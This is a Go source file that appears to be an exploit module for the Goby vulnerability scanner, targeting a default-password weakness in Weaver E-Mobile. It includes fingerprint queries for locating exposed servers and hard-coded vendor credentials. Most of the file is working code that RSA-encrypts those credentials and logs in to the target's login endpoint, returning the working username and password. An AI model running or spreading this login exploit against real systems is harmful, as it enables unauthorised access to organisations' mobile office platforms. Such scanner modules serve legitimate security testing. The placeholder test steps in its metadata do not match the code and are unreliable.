package exploits

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"net/url"
	"os"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Weaver-EMobile Default Password Vulnerability",
    "Description": "<p>Weaver e-mobile is an enterprise-level mobile office solution designed to enhance mobile office efficiency. However, the platform has a hard-coded password issue, which attackers can exploit to brute force into user systems, causing system damage.</p>",
    "Product": "Weaver-EMobile",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-02-23",
    "PostTime": "2024-11-25",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(body=\"content=\\\"Weaver E-mobile\\\"\" || (body=\"E-Mobile&nbsp;\" && body=\"action=\\\"/verifyLogin.do\") || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\"))",
    "GobyQuery": "(body=\"content=\\\"Weaver E-mobile\\\"\" || (body=\"E-Mobile&nbsp;\" && body=\"action=\\\"/verifyLogin.do\") || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\"))",
    "Level": "2",
    "Impact": "<p>This vulnerability may allow attackers to brute force into user systems, gain unauthorized access, and potentially cause system damage and data leakage.</p>",
    "Recommendation": "<p>1. Modify the weak password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/142565510"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "泛微e-mobile移动管理平台 默认口令漏洞",
            "Product": "泛微-EMobile",
            "Description": "<p>泛微e-mobile移动管理平台是一款企业级移动办公解决方案，旨在提高企业的移动办公效率。然而，该平台存在硬编码口令的问题，攻击者可以利用这一漏洞通过暴力破解进入用户系统，造成系统破坏。</p>",
            "Recommendation": "<p>1、修改弱口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>该漏洞可能导致攻击者通过暴力破解进入用户系统，获取未授权访问权限，进而造成系统破坏和数据泄露。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Weaver-EMobile Default Password Vulnerability",
            "Product": "Weaver-EMobile",
            "Description": "<p>Weaver e-mobile is an enterprise-level mobile office solution designed to enhance mobile office efficiency. However, the platform has a hard-coded password issue, which attackers can exploit to brute force into user systems, causing system damage.</p>",
            "Recommendation": "<p>1. Modify the weak password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>This vulnerability may allow attackers to brute force into user systems, gain unauthorized access, and potentially cause system damage and data leakage.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9974"
}`

	//请求发送
	//注意：本函数传入的参数为hostInfo
	//注意：模板编写后务必全局替换后面随机字符AAAA, POC检测函数也需要同步修改
	sendPayloadyp2Vnbp5 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/emp/passport/login`
		vulInfo := ``
		userInfoList := []string{`sysadmin`}
		pwdInfoList := []string{`Weaver#2012!@#`, `Weaver#2012`}

		for _, userInfo := range userInfoList {
			for _, pwdInfo := range pwdInfoList {
				//随机生成uuid
				uuid := make([]byte, 16)
				n, err := io.ReadFull(rand.Reader, uuid)
				if n != len(uuid) || err != nil {
					//fmt.Printf("生成UUID出错: %s\n", err)
					return false, "", ""
				}

				// 以下几行代码用于确保UUID的某些位符合UUID v4的标准
				uuid[8] = uuid[8]&^0xc0 | 0x80 // 设置版本号
				uuid[6] = uuid[6]&^0xf0 | 0x40 // 设置变体

				// 将UUID转换为字符串格式
				uuidStr := fmt.Sprintf("%x-%x-%x-%x-%x", uuid[0:4], uuid[4:6], uuid[6:8], uuid[8:10], uuid[10:])

				//获取公钥
				GetRequest := httpclient.NewGetRequestConfig("/emp/passport/securitysetting/get?loginUUID=" + uuidStr)
				GetRequest.Timeout = 30
				GetRequest.VerifyTls = false
				GetRequest.FollowRedirect = false

				GetRequest.Header.Store("User-Agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
				GetRequest.Header.Store("Accept", " */*")
				GetRequest.Header.Store("Accept-Encoding", " gzip, deflate")

				resp, err := httpclient.DoHttpRequest(hostInfo, GetRequest)
				if err != nil {
					return false, "", ""
				}

				regular := `"publicKey":"([^"]+)"`

				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
				publicKey, err := makeRegular(resp.RawBody, regular)
				if err != nil {
					return false, "", ""
				}
				//log.Println("publicKey:", publicKey)
				publicKey = "-----BEGIN PUBLIC KEY-----\r\n" + publicKey + "\r\n-----END PUBLIC KEY-----"
				block, _ := pem.Decode([]byte(publicKey))

				if block == nil {
					//fmt.Println("无法解析公钥")
					os.Exit(1)
				}

				pub, err := x509.ParsePKIXPublicKey(block.Bytes)
				if err != nil {
					//fmt.Printf("解析公钥出错: %s\n", err)
					os.Exit(1)
				}
				rsaPub, ok := pub.(*rsa.PublicKey)
				if !ok {
					//fmt.Println("公钥不是RSA公钥")
					os.Exit(1)
				}
				// 要加密的数据
				userInfo := userInfo
				userPwd := pwdInfo

				//将要加密的值进行url编码
				userInfo = url.QueryEscape(userInfo)
				//userInfo = base64.StdEncoding.EncodeToString([]byte(userInfo))
				plaintext := []byte(userInfo)
				plaintextPwd := []byte(userPwd)

				// 使用RSA公钥进行加密
				ciphertextInfo, err := rsa.EncryptPKCS1v15(rand.Reader, rsaPub, plaintext)
				if err != nil {
					//fmt.Printf("加密出错: %s\n", err)
					os.Exit(1)
				}
				ciphertextPwd, err1 := rsa.EncryptPKCS1v15(rand.Reader, rsaPub, plaintextPwd)
				if err1 != nil {
					//fmt.Printf("加密出错: %s\n", err1)
					os.Exit(1)
				}

				// 打印加密后的数据（通常为十六进制格式）
				//fmt.Printf("加密后的数据: %x\n", ciphertext)
				//base64加密
				encodedInfo := base64.StdEncoding.EncodeToString(ciphertextInfo)
				encodedPwd := base64.StdEncoding.EncodeToString(ciphertextPwd)
				//登录
				postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
				postRequestConfig.VerifyTls = false
				postRequestConfig.FollowRedirect = false
				postRequestConfig.Header.Store("Accept-Language", " zh-CN,zh;q=0.9")
				postRequestConfig.Header.Store("X-Requested-With", " XMLHttpRequest")
				postRequestConfig.Header.Store("User-Agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36")
				postRequestConfig.Header.Store("Content-Type", " application/json")
				postRequestConfig.Header.Store("Accept", " application/json, text/plain, */*")
				postRequestConfig.Header.Store("Accept-Encoding", " gzip, deflate")
				postRequestConfig.Data = fmt.Sprintf("{\"key\":\"\",\"loginid\":\"%s\",\"password\":\"%s\",\"login_type\":2,\"loginUUID\":\"%s\"}", encodedInfo, encodedPwd, uuidStr)
				//请求
				response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
				if err != nil {
					return false, vulInfo, vulPath
				}
				if strings.Contains(response.RawBody, "\"errcode\":0") {
					vulInfo = userInfo + ":" + pwdInfo
					return true, vulInfo, vulPath
				}
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadyp2Vnbp5(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadyp2Vnbp5(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
